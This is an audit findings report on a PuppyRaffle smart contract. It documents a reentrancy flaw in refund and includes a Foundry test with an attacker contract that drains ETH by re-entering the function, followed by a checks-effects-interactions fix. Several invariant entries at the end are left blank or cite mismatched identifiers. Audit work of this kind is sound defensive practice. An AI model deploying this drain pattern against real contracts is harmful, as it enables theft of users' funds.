# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac


## High Risk Findings
[H-0]. Reentrancy in PuppyRaffle::refund


### Number of Findings
- H: 1
- M: 0
- L: 0
- I: 0



# High Risk Findings

## [H-0]. Reentrancy in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract has a critical reentrancy vulnerability. It sends ETH to the player before updating the state to mark the player as refunded. This allows a malicious contract to reenter the refund function multiple times and drain funds.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // @audit reentrancy vulnerability: external call before state update
    payable(msg.sender).sendValue(entranceFee);
    
    // Update state after external call
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

## Impact
An attacker can exploit this vulnerability to drain all ETH from the contract by repeatedly calling the refund function before the state is updated. This compromises the entire raffle system and results in loss of funds for legitimate participants.

## Proof of Concept
An attacker can exploit this vulnerability by creating a malicious contract that implements a fallback function to call refund again when it receives ETH. This allows them to refund the same position multiple times.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 playerIndex;
    uint256 attackCount;
    uint256 maxAttacks;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }

    function attack(uint256 _playerIndex, uint256 _maxAttacks) external payable {
        playerIndex = _playerIndex;
        maxAttacks = _maxAttacks;
        attackCount = 0;
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    address attackerWallet = address(0x1);
    address user = address(0x2);
    uint256 entranceFee = 1 ether;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        attacker = new ReentrancyAttacker(address(puppyRaffle));
    }

    function testReentrancyAttack() public {
        // Fund the contract with some ETH
        address[] memory players = new address[](2);
        players[0] = user;
        players[1] = address(attacker);
        
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        
        // Check initial balances
        uint256 initialContractBalance = address(puppyRaffle).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        
        console.log("Initial contract balance:", initialContractBalance);
        console.log("Initial attacker balance:", initialAttackerBalance);
        
        // Get the attacker's index
        uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        
        // Perform the attack (reentering 2 times)
        vm.prank(address(attacker));
        attacker.attack(attackerIndex, 2);
        
        // Check final balances
        uint256 finalContractBalance = address(puppyRaffle).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        
        console.log("Final contract balance:", finalContractBalance);
        console.log("Final attacker balance:", finalAttackerBalance);
        
        // The attacker should have received 3 entrance fees (3 ether)
        // while only paying 1 entrance fee
        assertEq(finalAttackerBalance, initialAttackerBalance + (entranceFee * 3));
        
        // The contract should have lost 3 ether
        assertEq(finalContractBalance, initialContractBalance - (entranceFee * 3));
    }
}

## Suggested Mitigation
To fix this vulnerability, implement the Checks-Effects-Interactions pattern by updating the state before making external calls:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before external call
    players[playerIndex] = address(0);
    
    // Make external call after state update
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

Alternatively, you can add a nonReentrant modifier from OpenZeppelin's ReentrancyGuard contract to prevent reentrancy attacks.




# {} Invariant Violations

## 0. Balance Violation

## Description
Each player can receive at most one refund of exactly entranceFee.

## Impact
Unlimited multiple refunds let one player drain all ETH held for other players and prize pools.

## Proof of Concept
contract.refund(idx) re-enters via fallback, calling refund(idx) before REF_244 zeroes the slot.

## Pre-State
players[playerIdx] = attacker; contract balance ≥ 2×entranceFee

## Post-State
attacker balance +2×entranceFee, contract balance −2×entranceFee, players[playerIdx] finally set to 0

## Suggested Mitigation
Move players[playerIdx]=address(0) assignment before sendValue or add ReentrancyGuard.

## 1. Permission Violation

## Description
Only the address stored at players[index] can call refund for that index.

## Impact


## Proof of Concept


## Pre-State


## Post-State


## Suggested Mitigation


## 2. Balance Violation

## Description
totalFees must equal contract ETH balance when players.length == 0 (assumed by withdrawFees).

## Impact
Funds trapped or incorrect accounting.

## Proof of Concept
Call sequence of INV-1, then selectWinner (clears players), then withdrawFees reverts.

## Pre-State
players.length == 0; totalFees > contract.balance

## Post-State
withdrawFees reverts forever; owner cannot recover fees; accounting invariant broken.

## Suggested Mitigation
Fix INV-1; additionally recompute totalFees on refunds or track separately.

## 3. Temporal Violation

## Description
selectWinner executable only after raffleDuration has elapsed since raffleStartTime.

## Impact


## Proof of Concept


## Pre-State


## Post-State


## Suggested Mitigation


## 4. Permission Violation

## Description
Only contract owner can change feeAddress.

## Impact


## Proof of Concept


## Pre-State


## Post-State


## Suggested Mitigation


## 5. Balance Violation

## Description
Contract ETH balance can never fall below totalFees (fees are a subset of balance).

## Impact
Fee funds effectively stolen; accounting corrupted; owner withdrawal blocked.

## Proof of Concept
See INV-1 steps followed by balance inspection.

## Pre-State
totalFees = x, balance = x; attacker ready.

## Post-State
totalFees = x, balance = x − n·entranceFee (n≥1).

## Suggested Mitigation
As per INV-1 plus check-effects-interactions order.


